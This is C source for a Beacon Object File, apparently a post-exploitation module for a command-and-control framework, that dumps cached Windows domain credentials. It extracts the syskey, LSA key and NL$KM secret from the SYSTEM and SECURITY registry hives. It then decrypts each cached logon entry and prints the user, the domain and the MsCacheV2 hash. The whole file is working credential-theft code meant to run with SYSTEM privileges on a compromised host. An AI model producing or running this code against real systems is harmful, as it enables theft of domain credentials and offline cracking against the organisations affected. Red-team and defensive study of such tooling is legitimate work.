/*
 * lsadump_cache BOF by shashinma
 * Dumps cached domain credentials (DCC2/MSCacheV2)
 * Requires SYSTEM privileges
 */

#include "include/cache.h"
#include "lsadump_helper.c"

// ============================================================================
// Crypto: AES-128 CTS Decryption (Cipher-text Stealing)
// ============================================================================

static HCRYPTKEY CreateAES128Key(HCRYPTPROV hProv, const BYTE* key, DWORD mode) {
    AES128_KEY_BLOB keyBlob;
    HCRYPTKEY hKey = 0;

    keyBlob.header.bType = PLAINTEXTKEYBLOB;
    keyBlob.header.bVersion = CUR_BLOB_VERSION;
    keyBlob.header.reserved = 0;
    keyBlob.header.aiKeyAlg = CALG_AES_128;
    keyBlob.keySize = AES_128_KEY_SIZE;
    MSVCRT$memcpy(keyBlob.key, key, AES_128_KEY_SIZE);

    if (!ADVAPI32$CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey))
        return 0;

    ADVAPI32$CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
    return hKey;
}

static BOOL DecryptAES128_CTS(HCRYPTPROV hProv, const BYTE* key, const BYTE* iv,
                               const BYTE* encrypted, DWORD encLen, BYTE* decrypted) {
    HCRYPTKEY hKeyCBC = 0, hKeyECB = 0;
    DWORD numBlocks, i;
    BYTE block[16], prevCipher[16], tmp[16];
    DWORD blockLen;

    if (encLen < 16) return FALSE;

    numBlocks = (encLen + 15) / 16;
    MSVCRT$memcpy(prevCipher, iv, 16);

    hKeyCBC = CreateAES128Key(hProv, key, CRYPT_MODE_CBC);
    if (!hKeyCBC) return FALSE;
    ADVAPI32$CryptSetKeyParam(hKeyCBC, KP_IV, (BYTE*)iv, 0);

    if (numBlocks <= 1) {
        MSVCRT$memcpy(decrypted, encrypted, encLen);
        blockLen = 16;
        ADVAPI32$CryptDecrypt(hKeyCBC, 0, FALSE, 0, decrypted, &blockLen);
        ADVAPI32$CryptDestroyKey(hKeyCBC);
        return TRUE;
    }

    for (i = 0; i < numBlocks - 2; i++) {
        MSVCRT$memcpy(block, encrypted + i * 16, 16);
        MSVCRT$memcpy(tmp, block, 16);
        blockLen = 16;
        if (!ADVAPI32$CryptDecrypt(hKeyCBC, 0, FALSE, 0, block, &blockLen)) {
            ADVAPI32$CryptDestroyKey(hKeyCBC);
            return FALSE;
        }
        MSVCRT$memcpy(decrypted + i * 16, block, 16);
        MSVCRT$memcpy(prevCipher, tmp, 16);
    }

    ADVAPI32$CryptDestroyKey(hKeyCBC);

    DWORD lastBlockSize = encLen - (numBlocks - 1) * 16;
    BYTE* Cn_1 = (BYTE*)(encrypted + (numBlocks - 2) * 16);
    BYTE* Cn = (BYTE*)(encrypted + (numBlocks - 1) * 16);

    hKeyECB = CreateAES128Key(hProv, key, CRYPT_MODE_ECB);
    if (!hKeyECB) return FALSE;

    BYTE intermediate[16];
    MSVCRT$memcpy(intermediate, Cn_1, 16);
    blockLen = 16;
    ADVAPI32$CryptDecrypt(hKeyECB, 0, FALSE, 0, intermediate, &blockLen);

    BYTE paddedCn[16];
    MSVCRT$memset(paddedCn, 0, 16);
    MSVCRT$memcpy(paddedCn, Cn, lastBlockSize);
    for (i = lastBlockSize; i < 16; i++)
        paddedCn[i] = intermediate[i];

    BYTE Pn[16];
    for (i = 0; i < 16; i++)
        Pn[i] = intermediate[i] ^ paddedCn[i];
    MSVCRT$memcpy(decrypted + (numBlocks - 1) * 16, Pn, lastBlockSize);

    MSVCRT$memcpy(block, paddedCn, 16);
    blockLen = 16;
    ADVAPI32$CryptDecrypt(hKeyECB, 0, FALSE, 0, block, &blockLen);

    for (i = 0; i < 16; i++)
        block[i] ^= prevCipher[i];

    MSVCRT$memcpy(decrypted + (numBlocks - 2) * 16, block, 16);
    ADVAPI32$CryptDestroyKey(hKeyECB);

    return TRUE;
}

// ============================================================================
// Get LSA key from PolEKList
// ============================================================================

static BOOL GetLsaKey(HKEY hSecurity, const BYTE sysKey[SYSKEY_LENGTH], BYTE lsaKey[AES_256_KEY_SIZE], HCRYPTPROV hProv) {
    HKEY hPolicy, hPolKey;
    DWORD size, type;
    BYTE* polEKList = NULL;
    BYTE derivedKey[AES_256_KEY_SIZE];
    DWORD secretSize, encryptedSize;
    LONG res;
    
    res = ADVAPI32$RegOpenKeyExW(hSecurity, L"Policy", 0, KEY_READ, &hPolicy);
    if (res != ERROR_SUCCESS) return FALSE;
    
    res = ADVAPI32$RegOpenKeyExW(hPolicy, L"PolEKList", 0, KEY_READ, &hPolKey);
    if (res != ERROR_SUCCESS) {
        ADVAPI32$RegCloseKey(hPolicy);
        return FALSE;
    }
    
    size = 0;
    ADVAPI32$RegQueryValueExW(hPolKey, NULL, NULL, &type, NULL, &size);
    if (size < 60) {
        ADVAPI32$RegCloseKey(hPolKey);
        ADVAPI32$RegCloseKey(hPolicy);
        return FALSE;
    }
    
    polEKList = (BYTE*)AllocMem(size);
    if (!polEKList) {
        ADVAPI32$RegCloseKey(hPolKey);
        ADVAPI32$RegCloseKey(hPolicy);
        return FALSE;
    }
    
    res = ADVAPI32$RegQueryValueExW(hPolKey, NULL, NULL, NULL, polEKList, &size);
    ADVAPI32$RegCloseKey(hPolKey);
    ADVAPI32$RegCloseKey(hPolicy);
    if (res != ERROR_SUCCESS) { FreeMem(polEKList); return FALSE; }
    
    if (!DeriveKey(hProv, sysKey, SYSKEY_LENGTH, polEKList + 28, LAZY_NT6_IV_SIZE, 1000, derivedKey, AES_256_KEY_SIZE)) {
        FreeMem(polEKList);
        return FALSE;
    }
    
    encryptedSize = size - 60;
    if (encryptedSize < 32) { FreeMem(polEKList); return FALSE; }
    
    if (!DecryptAES256_ECB(hProv, derivedKey, polEKList + 60, encryptedSize, polEKList + 60)) {
        FreeMem(polEKList);
        return FALSE;
    }
    
    secretSize = *(DWORD*)(polEKList + 60);
    if (secretSize == 0 || secretSize > encryptedSize) {
        FreeMem(polEKList);
        return FALSE;
    }
    
    BYTE* keysData = polEKList + 60 + 16;
    DWORD nbKeys = *(DWORD*)(keysData + 24);
    if (nbKeys == 0) {
        FreeMem(polEKList);
        return FALSE;
    }
    
    BYTE* firstKey = keysData + 28;
    DWORD keySize = *(DWORD*)(firstKey + 20);
    if (keySize > 32) keySize = 32;
    MSVCRT$memcpy(lsaKey, firstKey + 24, keySize);
    
    FreeMem(polEKList);
    return TRUE;
}

// ============================================================================
// Decrypt NL$KM secret
// ============================================================================

static BOOL GetNLKM(HKEY hSecurity, const BYTE lsaKey[AES_256_KEY_SIZE], BYTE nlkm[16], HCRYPTPROV hProv) {
    HKEY hCurrVal;
    DWORD size, type, encryptedSize, secretSize;
    BYTE* encData = NULL;
    BYTE derivedKey[AES_256_KEY_SIZE];
    LONG res;
    
    res = ADVAPI32$RegOpenKeyExW(hSecurity, L"Policy\\Secrets\\NL$KM\\CurrVal", 0, KEY_READ, &hCurrVal);
    if (res != ERROR_SUCCESS) return FALSE;
    
    size = 0;
    ADVAPI32$RegQueryValueExW(hCurrVal, NULL, NULL, &type, NULL, &size);
    if (size < 60) {
        ADVAPI32$RegCloseKey(hCurrVal);
        return FALSE;
    }
    
    encData = (BYTE*)AllocMem(size);
    if (!encData) { ADVAPI32$RegCloseKey(hCurrVal); return FALSE; }
    
    res = ADVAPI32$RegQueryValueExW(hCurrVal, NULL, NULL, NULL, encData, &size);
    ADVAPI32$RegCloseKey(hCurrVal);
    if (res != ERROR_SUCCESS) { FreeMem(encData); return FALSE; }
    
    if (!DeriveKey(hProv, lsaKey, AES_256_KEY_SIZE, encData + 28, LAZY_NT6_IV_SIZE, 1000, derivedKey, AES_256_KEY_SIZE)) {
        FreeMem(encData);
        return FALSE;
    }
    
    encryptedSize = size - 60;
    if (encryptedSize < 32) { FreeMem(encData); return FALSE; }
    
    if (!DecryptAES256_ECB(hProv, derivedKey, encData + 60, encryptedSize, encData + 60)) {
        FreeMem(encData);
        return FALSE;
    }
    
    secretSize = *(DWORD*)(encData + 60);
    if (secretSize < 16 || secretSize > encryptedSize) {
        FreeMem(encData);
        return FALSE;
    }
    
    MSVCRT$memcpy(nlkm, encData + 60 + 16, 16);
    
    FreeMem(encData);
    return TRUE;
}

// ============================================================================
// Enumerate and decrypt cached credentials
// ============================================================================

static void EnumerateCache(HKEY hSecurity, const BYTE nlkm[16], HCRYPTPROV hProv) {
    HKEY hCache;
    DWORD nbValues, maxNameLen, maxValueLen, i;
    wchar_t* valueName = NULL;
    BYTE* valueData = NULL;
    BYTE* decrypted = NULL;
    DWORD nameLen, dataLen, type;
    DWORD iter = 10240, iterCount;
    DWORD cacheCount = 0;
    LONG res;
    
    res = ADVAPI32$RegOpenKeyExW(hSecurity, L"Cache", 0, KEY_READ, &hCache);
    if (res != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open Cache: %d\n", res);
        return;
    }
    
    DWORD iterSize = sizeof(iterCount);
    if (ADVAPI32$RegQueryValueExW(hCache, L"NL$IterationCount", NULL, NULL, (LPBYTE)&iterCount, &iterSize) == ERROR_SUCCESS) {
        iter = (iterCount > 10240) ? (iterCount & ~0x3ff) : (iterCount << 10);
        BeaconPrintf(CALLBACK_OUTPUT, "* NL$IterationCount is %u, %u real iteration(s)\n", iterCount, iter);
        if (!iterCount)
            BeaconPrintf(CALLBACK_OUTPUT, "* DCC1 mode!\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "* Iteration is set to default (10240)\n");
    }
    
    if (ADVAPI32$RegQueryInfoKeyW(hCache, NULL, NULL, NULL, NULL, NULL, NULL, &nbValues, &maxNameLen, &maxValueLen, NULL, NULL) != ERROR_SUCCESS) {
        ADVAPI32$RegCloseKey(hCache);
        return;
    }
    
    maxNameLen++;
    valueName = (wchar_t*)AllocMem((maxNameLen + 1) * sizeof(wchar_t));
    valueData = (BYTE*)AllocMem(maxValueLen);
    decrypted = (BYTE*)AllocMem(maxValueLen);
    if (!valueName || !valueData || !decrypted) {
        if (valueName) FreeMem(valueName);
        if (valueData) FreeMem(valueData);
        if (decrypted) FreeMem(decrypted);
        ADVAPI32$RegCloseKey(hCache);
        return;
    }
    
    for (i = 0; i < nbValues; i++) {
        PMSCACHE_ENTRY entry;
        DWORD encDataSize;
        wchar_t* username;
        wchar_t* domain;
        char usernameA[128], domainA[128];
        DWORD j;
        
        nameLen = maxNameLen;
        dataLen = maxValueLen;
        
        if (ADVAPI32$RegEnumValueW(hCache, i, valueName, &nameLen, NULL, &type, valueData, &dataLen) != ERROR_SUCCESS)
            continue;
        
        if (MSVCRT$_wcsnicmp(valueName, L"NL$Control", 10) == 0 ||
            MSVCRT$_wcsnicmp(valueName, L"NL$IterationCount", 17) == 0)
            continue;
        
        entry = (PMSCACHE_ENTRY)valueData;
        
        if (!(entry->flags & 1))
            continue;
        
        encDataSize = dataLen - FIELD_OFFSET_ENC_DATA;
        if (encDataSize < sizeof(MSCACHE_DATA))
            continue;
        
        BeaconPrintf(CALLBACK_OUTPUT, "\n[%S]\n", valueName);
        BeaconPrintf(CALLBACK_OUTPUT, "RID       : %08x (%u)\n", entry->userId, entry->userId);
        
        if (!DecryptAES128_CTS(hProv, nlkm, entry->iv, entry->enc_data, encDataSize, decrypted)) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Decryption failed\n");
            continue;
        }
        
        PMSCACHE_DATA msCacheData = (PMSCACHE_DATA)decrypted;
        
        username = (wchar_t*)(decrypted + sizeof(MSCACHE_DATA));
        for (j = 0; j < entry->szUserName / 2 && j < 127; j++)
            usernameA[j] = (char)username[j];
        usernameA[j] = '\0';
        
        domain = (wchar_t*)((BYTE*)username + SIZE_ALIGN(entry->szUserName, 4));
        for (j = 0; j < entry->szDomainName / 2 && j < 127; j++)
            domainA[j] = (char)domain[j];
        domainA[j] = '\0';
        
        char hashStr[64];
        FormatHex(msCacheData->mshashdata, LM_NTLM_HASH_LENGTH, hashStr, sizeof(hashStr));
        BeaconPrintf(CALLBACK_OUTPUT, "User      : %s\\%s\nMsCacheV2 : %s\n", domainA, usernameA, hashStr);
        
        cacheCount++;
    }
    
    FreeMem(valueName);
    FreeMem(valueData);
    FreeMem(decrypted);
    ADVAPI32$RegCloseKey(hCache);
    
    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] %u cached credential(s)\n", cacheCount);
}

// ============================================================================
// Entry Point
// ============================================================================

void go(char* args, int len) {
    (void)args; (void)len;
    
    HKEY hSystem = NULL, hSecurity = NULL;
    BYTE sysKey[SYSKEY_LENGTH];
    BYTE lsaKey[AES_256_KEY_SIZE];
    BYTE nlkm[16];
    LONG res;
    HCRYPTPROV hProv = 0;
    char hexStr[64];
    
    BeaconPrintf(CALLBACK_OUTPUT, "\n=== lsadump::cache ===\n\n");
    
    if (!ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CryptAcquireContext failed\n");
        return;
    }
    
    res = ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_READ, &hSystem);
    if (res != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open SYSTEM: %d\n", res);
        ADVAPI32$CryptReleaseContext(hProv, 0);
        return;
    }
    
    if (!GetSyskey(hSystem, sysKey)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to extract syskey\n");
        ADVAPI32$RegCloseKey(hSystem);
        ADVAPI32$CryptReleaseContext(hProv, 0);
        return;
    }
    FormatHex(sysKey, SYSKEY_LENGTH, hexStr, sizeof(hexStr));
    BeaconPrintf(CALLBACK_OUTPUT, "Syskey: %s\n", hexStr);
    ADVAPI32$RegCloseKey(hSystem);
    
    res = ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SECURITY", 0, KEY_READ, &hSecurity);
    if (res != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open SECURITY: %d (need SYSTEM privileges)\n", res);
        ADVAPI32$CryptReleaseContext(hProv, 0);
        return;
    }
    
    if (!GetLsaKey(hSecurity, sysKey, lsaKey, hProv)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to get LSA key\n");
        ADVAPI32$RegCloseKey(hSecurity);
        ADVAPI32$CryptReleaseContext(hProv, 0);
        return;
    }
    
    if (!GetNLKM(hSecurity, lsaKey, nlkm, hProv)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to get NL$KM (no cached credentials?)\n");
        ADVAPI32$RegCloseKey(hSecurity);
        ADVAPI32$CryptReleaseContext(hProv, 0);
        return;
    }
    FormatHex(nlkm, 16, hexStr, sizeof(hexStr));
    BeaconPrintf(CALLBACK_OUTPUT, "NL$KM : %s\n", hexStr);
    
    EnumerateCache(hSecurity, nlkm, hProv);
    
    ADVAPI32$RegCloseKey(hSecurity);
    ADVAPI32$CryptReleaseContext(hProv, 0);
}
